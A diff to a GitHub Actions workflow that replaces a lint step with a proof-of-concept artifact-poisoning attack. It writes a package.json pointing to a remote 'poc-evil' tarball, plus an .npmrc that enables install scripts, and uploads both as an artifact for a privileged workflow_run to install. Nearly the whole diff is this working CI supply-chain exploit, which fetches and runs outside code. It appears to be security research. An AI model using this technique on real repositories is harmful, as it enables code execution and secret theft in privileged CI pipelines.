@@ -8,4 +8,19 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "benign upstream standing in for the repo's real Lint workflow"
+      - name: craft artifact consumed by privileged workflow_run
+        env:
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p out
+          printf '%s' '{"name":"root-poc","version":"1.0.0","private":true,"dependencies":{"poc-evil":"https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-5.0.0.tgz"}}' > out/package.json
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
+          printf 'attacker controlled linter report\n' > out/linter-report.txt
+          echo "$PR_NUMBER" > out/pr-number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: out/
+          include-hidden-files: true
+          if-no-files-found: error
